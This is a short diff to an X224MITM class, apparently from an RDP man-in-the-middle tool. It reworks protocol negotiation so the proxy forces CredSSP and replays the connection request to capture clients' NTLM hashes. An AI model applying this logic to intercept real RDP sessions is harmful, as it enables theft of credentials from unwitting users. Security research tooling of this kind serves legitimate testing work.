@@ -83,7 +83,7 @@ class X224MITM:
             # Tell the server we only support the allowed authentication methods.
             chosenProtocols &= self.state.config.authMethods
 
-        if not self.state.ntlmCapture:
+        if self.state.ntlmCapture:
             chosenProtocols = NegotiationProtocols.SSL | NegotiationProtocols.CRED_SSP
 
         modifiedRequest = NegotiationRequestPDU(
@@ -134,13 +134,12 @@ class X224MITM:
 
                     # Use redirection host and replay sequence starting from the connection request
                     self.state.useRedirectionHost()
-                    self.onConnectionRequest(self.originalConnectionRequest)
-                    return
                 else:
                     self.log.info("Server requires CredSSP. Reconnecting with server and attempting to capture client's NTLM hashes.")
                     self.state.ntlmCapture = True
-                    self.onConnectionRequest(pdu)
-                    return
+
+                self.onConnectionRequest(self.originalConnectionRequest)
+                return
             else:
                 self.log.info("The server failed the negotiation. Error: %(error)s", {"error": NegotiationFailureCode.getMessage(response.failureCode)})
                 payload = pdu.payload
